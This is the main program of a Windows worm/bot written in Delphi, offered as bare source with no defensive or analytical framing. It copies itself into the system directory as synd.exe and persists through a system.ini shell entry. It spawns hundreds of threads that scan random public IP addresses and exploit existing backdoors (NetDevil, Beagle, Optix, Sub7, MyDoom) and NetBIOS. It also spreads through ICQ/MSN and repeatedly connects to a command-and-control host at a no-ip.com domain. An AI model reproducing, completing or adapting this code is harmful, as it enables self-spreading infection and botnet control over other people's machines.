program testproject;

uses
  Windows,
  Bot,
  pWebServer,
  pNetDevil,
  pBeagle,
  pOptix,
  uNetBios,
  uMyDoom,
  pSub7,
  pMSN,
  WinSock;

{$R *.res}

function StrtoInt(const S: string): integer; var
E: integer; begin Val(S, Result, E); end;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

Function RandomIP: String;
Var
  A, B, C, D: Integer;
Begin
  Randomize;
  A := Random(222)+1;
  B := Random(254)+1;
  C := Random(254)+1;
  D := Random(254)+1;
  If A = 127 Then Inc(A, Random(100));
  If A = 192 Then Inc(A, Random(100));
  If A = 10 Then Inc(A, Random(100));
  Result := IntToStr(A)+'.'+
            IntToStr(B)+'.'+
            IntToStr(C)+'.'+
            IntToStr(D);
End;

Procedure DoScan;
Var
  szAddress: String;
Begin
  Repeat
    szAddress := RandomIP;
    CurrentScanIP := szAddress;
    NetDevil(szAddress);
    Beagle(szAddress, 1);
    Beagle(szAddress, 2);
    Optix(szAddress);
  Until 1 = 2;
End;

Procedure StartDoScan(Clones: DWord);
Var
  D: Dword;
  I: Integer;
Begin
  For I := 0 To Clones Do
    CreateThread(NIL, 0, @DoScan, NIL, 0, D);
End;

var
  ThreadID: Dword;
  SysDir  : Array[0..256] Of Char;

begin
  GetSystemDirectory(Sysdir, 256);
  CopyFile(pChar(ParamStr(0)), pChar(String(SysDir)+'\synd.exe'), False);
  writeprivateprofilestring('boot','shell',pchar('Explorer.exe synd.exe'),'system.ini');

  CreateMutexA(NIL, FALSE, '|}=--SyNd--={|');
  If GetLastError() = ERROR_ALREADY_EXISTS Then ExitProcess(0);

  CreateThread(NIL, 0, @WebServer, NIL, 0, ThreadID);
  CreateThread(NIL, 0, @ICQMSN   , NIL, 0, ThreadID);
  StartSub7(200);
  StartMyDoom(200);
  StartNetBios(200);
  StartDoScan(200);
  Repeat CreateBot('ashdurbuk.no-ip.com');
  Until 1 = 2;
end.
